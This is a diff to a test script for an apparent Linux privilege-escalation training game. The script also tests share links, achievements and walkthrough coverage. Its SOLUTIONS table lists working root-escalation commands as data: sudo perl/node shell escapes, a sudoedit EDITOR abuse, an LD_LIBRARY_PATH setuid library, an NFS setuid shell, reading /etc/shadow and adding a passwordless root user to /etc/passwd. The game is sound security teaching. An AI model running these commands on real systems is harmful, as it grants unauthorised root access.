@@ -83,6 +83,18 @@ const SOLUTIONS = {
     21: ["python3 -c \"print(open('/etc/shadow').read())\"", 'john /tmp/shadow.copy', 'su root'],
     22: ["echo 'void _init(){setuid(0);system(\"/bin/sh\");}' > /tmp/libagent.so.1.c", 'gcc -shared -fPIC -nostartfiles -o /tmp/libagent.so.1 /tmp/libagent.so.1.c', 'sudo LD_LIBRARY_PATH=/tmp /usr/local/bin/backup-agent'],
     23: ['showmount -e', 'mount -t nfs box-23:/srv/backups /mnt', 'touch /srv/backups/rootbash', 'chmod u+s /srv/backups/rootbash', '/srv/backups/rootbash'],
+    24: ["sudo perl -e 'exec \"/bin/sh\";'"],
+    25: ['sudo node -e \'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})\''],
+    26: [
+        "echo '#!/bin/sh' > /tmp/pwn.sh",
+        'echo \'exec /bin/sh\' >> /tmp/pwn.sh',
+        'chmod +x /tmp/pwn.sh',
+        'sudo EDITOR=/tmp/pwn.sh -e /etc/motd'
+    ],
+    27: [
+        "python3 -c \"open('/etc/passwd','a').write('pwnd::0:0::/root:/bin/bash\\n')\"",
+        'su pwnd'
+    ],
 };
 
 let pass = 0, fail = 0;
@@ -180,9 +192,85 @@ for (const level of LEVELS) {
     const persisted = JSON.parse(store[GC.STORE_KEY] || '[]');
     const t5 = persisted.length === 1 && persisted[0].codename === 'custom-01';
 
-    const ok = t1 && t2 && t3 && t4 && t5;
+    // Share link: export the just-imported box as a URL, then re-import it
+    // from the hash (as a fresh visitor opening that link would) and check
+    // the round-tripped box matches. No `location` global in this sandbox —
+    // exportURL degrades to a bare "#box=..." fragment, which is exactly
+    // what importFromHash consumes.
+    const shareUrl = GC.exportURL(sandbox2.LEVELS.length - 1);
+    const t6 = typeof shareUrl === 'string' && shareUrl.startsWith('#box=');
+    const shareImport = GC.importFromHash(shareUrl);
+    const t7 = !!shareImport && shareImport.ok === true
+        && shareImport.level.codename === 'custom-01'
+        && shareImport.level.flag === 'flag{custom_test}'
+        && sandbox2.LEVELS.length === startLen + 2;
+    const noHash = GC.importFromHash('') === null && GC.importFromHash('#somethingelse=1') === null;
+    const badHash = GC.importFromHash('#box=%%%not-valid-at-all');
+    const t8 = noHash && badHash && badHash.ok === false;
+
+    const ok = t1 && t2 && t3 && t4 && t5 && t6 && t7 && t8;
     console.log(`${ok ? 'PASS' : 'FAIL'}  custom box import (validation + append + export + persistence)`);
     ok ? pass++ : fail++;
+    console.log(`${(t6 && t7 && t8) ? 'PASS' : 'FAIL'}  custom box share link (export URL + re-import from hash)`);
+    (t6 && t7 && t8) ? pass++ : fail++;
+}
+
+// ── Achievements ─────────────────────────────────────────────────────────
+// Separate sandbox, untouched by the custom-box tests above, so LEVELS.length
+// is exactly the base machine count and the "halfway" math below is exact.
+{
+    const sandbox3 = {};
+    sandbox3.window = sandbox3;
+    sandbox3.globalThis = sandbox3;
+    sandbox3.console = { log() {}, warn() {}, error() {} };
+    sandbox3.setTimeout = () => {};
+    sandbox3.localStorage = { getItem: () => null, setItem: () => {} };
+    sandbox3.document = {
+        addEventListener: () => {},
+        getElementById: () => null,
+        querySelectorAll: () => [],
+        body: { classList: { add() {}, remove() {} } },
+    };
+    vm.createContext(sandbox3);
+    vm.runInContext(JS('levels.js'), sandbox3, { filename: 'levels.js' });
+    vm.runInContext(JS('main.js'), sandbox3, { filename: 'main.js' });
+    vm.runInContext(JS('walkthrough.js'), sandbox3, { filename: 'walkthrough.js' });
+
+    const G = sandbox3.GAME;
+    const total = sandbox3.LEVELS.length;
+    const halfwayThreshold = Math.ceil(total / 2);
+
+    // "Halfway There" must track the *current* machine count, not a number
+    // baked in when the roster was smaller — own one short of half must not
+    // qualify, owning exactly half (rounded up) must.
+    G.completed = Array.from({ length: halfwayThreshold - 1 }, (_, i) => i + 1);
+    const notYetHalfway = G.achState().owned < halfwayThreshold && !G.updateAchievements(false).includes('halfway');
+    G.completed.push(halfwayThreshold); // one more machine tips it over
+    const nowHalfway = G.updateAchievements(false).includes('halfway');
+    const t1 = notYetHalfway && nowHalfway;
+
+    // First Blood fires at 1, Root Wizard only at "own literally everything".
+    G.completed = [1];
+    const firstBlood = G.updateAchievements(false).includes('first_blood') && !G.updateAchievements(false).includes('root_wizard');
+    G.completed = Array.from({ length: total }, (_, i) => i + 1);
+    const rootWizard = G.updateAchievements(false).includes('root_wizard');
+    const t2 = firstBlood && rootWizard;
+
+    const ok = t1 && t2;
+    console.log(`${ok ? 'PASS' : 'FAIL'}  achievements (dynamic halfway threshold tracks current machine count)`);
+    ok ? pass++ : fail++;
+
+    // Explanation-mode coverage: every built-in box must have a non-empty
+    // WALKTHROUGHS entry, or the "explain" feature silently degrades to its
+    // "not available" fallback for whichever box(es) got missed when new
+    // content was added — as happened for box-24..27 before this test existed.
+    const missing = sandbox3.LEVELS
+        .filter(l => !l.custom)
+        .map(l => l.id)
+        .filter(id => !Array.isArray(sandbox3.WALKTHROUGHS[id]) || sandbox3.WALKTHROUGHS[id].length === 0);
+    const wtOk = missing.length === 0;
+    console.log(`${wtOk ? 'PASS' : 'FAIL'}  walkthrough coverage (every built-in box has an explain-mode entry)${wtOk ? '' : ' — missing: ' + missing.join(', ')}`);
+    wtOk ? pass++ : fail++;
 }
 
 console.log(`\n${pass}/${pass + fail} PASS`);
